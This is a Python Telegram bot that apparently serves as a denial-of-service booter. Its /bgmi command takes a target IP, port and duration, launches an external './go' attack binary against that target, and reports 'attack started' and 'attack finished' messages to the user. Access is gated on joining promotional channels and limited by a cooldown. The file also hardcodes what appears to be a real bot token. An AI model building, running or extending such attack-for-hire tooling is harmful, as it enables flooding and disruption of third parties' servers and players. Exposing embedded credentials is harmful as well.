import time  # For cooldown management
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import BadRequest

# Bot Token
BOT_TOKEN = "7798485138:AAE9LLHjyEWgeqCbY9XLLVM_Si8psEV37i8"

# Required channels (use channel usernames or IDs, not invitation links)
REQUIRED_CHANNELS = [
    "@NEXION_GAMING",
    "@patel_ji47",
    "@NEXION_FEEDBACK",
    "@NEXION_GAMEING_CHAT",
    "@flashmainchannel",
]

# Admin ID
ADMIN_ID = 1847934841

# File to store user IDs
USER_FILE = "users.txt"

# Cooldown management
user_cooldowns = {}
COOLDOWN_TIME = 1 * 60  # Cooldown time in seconds (10 minutes)


def load_users():
    """Load user IDs from a file."""
    try:
        with open(USER_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()


def save_user(user_id):
    """Save a new user ID to the file."""
    users = load_users()
    if user_id not in users:
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")


async def check_user_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if a user has joined all required channels."""
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            print(f"Error checking channel {channel}: {e}")
            return False
    return True


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message and list the required channels."""
    user = update.effective_user
    save_user(user.id)  # Save user to the file
    channels_list = "\n".join([f"- {channel}" for channel in REQUIRED_CHANNELS])
    message = (
        f"Hi {user.first_name}!\n\n"
        f"To use this bot, you must join the following channels:\n"
        f"{channels_list}\n\n"
        "After joining, you can use the /bgmi command."
    )
    await update.message.reply_text(message)


async def bgmi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /bgmi command with a cooldown restriction."""
    user = update.effective_user
    save_user(user.id)  # Save user to the file

    # Check if the user has joined all required channels
    if not await check_user_joined(user.id, context):
        await update.message.reply_text(
            "You need to join all required channels before using this bot!"
        )
        return

    # Check cooldown
    current_time = time.time()
    if user.id in user_cooldowns:
        last_attack_time = user_cooldowns[user.id]
        remaining_cooldown = COOLDOWN_TIME - (current_time - last_attack_time)
        if remaining_cooldown > 0:
            await update.message.reply_text(
                f"You can start your next attack in {int(remaining_cooldown / 60)} minutes and "
                f"{int(remaining_cooldown % 60)} seconds."
            )
            return

    # Parse the command arguments
    try:
        _, ip, port, time_duration = update.message.text.split()
    except ValueError:
        await update.message.reply_text("Invalid command format. Use: /bgmi <IP> <PORT> <TIME>")
        return

    # Build the terminal command
    command = ["./go", ip, port, time_duration]

    try:
        # Execute the command
        subprocess.Popen(command)

        # Save the current time as the user's last attack time
        user_cooldowns[user.id] = current_time

        # Notify the user
        attack_message = (
            f"🚀 Hi {user.first_name}, attack started on {ip}:{port} for {time_duration} seconds.\n\n"
            "❗ Please send feedback at: t.me/NEXION_OWNER"
        )
        await update.message.reply_text(attack_message)

        # Notify after the attack finishes and recheck channel membership
        context.application.job_queue.run_once(
            notify_attack_finished, when=int(time_duration), data={"chat_id": update.effective_chat.id, "ip": ip, "port": port, "user_id": user.id}
        )

    except Exception as e:
        print(f"Error starting attack: {e}")
        await update.message.reply_text("Failed to start the attack. Please try again later.")


async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE):
    """Notify the user that the attack has finished and recheck channel membership."""
    job_context = context.job.data
    chat_id = job_context["chat_id"]
    ip = job_context["ip"]
    port = job_context["port"]
    user_id = job_context["user_id"]

    # Notify attack finished
    finished_message = f"🚀 Attack on {ip}:{port} finished ✅"
    await context.bot.send_message(chat_id=chat_id, text=finished_message)

    # Recheck if the user is still a member of the required channels
    if not await check_user_joined(user_id, context):
        recheck_message = (
            "You are no longer a member of the required channels! "
            "Please join all the channels again to use this bot."
        )
        await context.bot.send_message(chat_id=chat_id, text=recheck_message)


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allow the admin to send a broadcast message to all users."""
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command!")
        return

    # Get the broadcast message
    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("Please provide a message to broadcast.")
        return

    # Load all user IDs
    users = load_users()
    success_count = 0
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except BadRequest:
            print(f"Failed to send message to {user_id}")

    await update.message.reply_text(f"Broadcast sent to {success_count} users.")


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bgmi", bgmi_command))
    application.add_handler(CommandHandler("broadcast", broadcast))  # Broadcast command

    # Start the bot
    application.run_polling()


if __name__ == "__main__":
    main()
